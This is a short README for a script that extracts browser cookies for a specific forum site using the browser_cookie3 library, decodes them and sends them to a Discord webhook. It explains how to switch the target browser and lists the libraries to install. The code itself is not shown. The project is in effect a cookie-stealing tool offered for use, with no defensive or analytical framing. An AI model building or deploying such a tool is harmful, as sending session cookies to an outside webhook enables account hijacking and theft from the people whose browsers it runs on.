# Cookie-Export-from-your-Browser-to-Discord
To change the target browser, replace 'firefox' with 'chrome, Edge', etc., respectively, in the line cookie = browser_cookie3.firefox(domain_name=TARGET_SITE). The script exports cookies from a restricted site (in this case, forum.matrp.ru) and decodes them, then sends them to the webhook in DS.

------------------------------------------------MAIN LIBRARIES-------------------------------------------
browser-cookie3 0.20.1 
requests 2.34.0

pip install browser-cookie3 requests
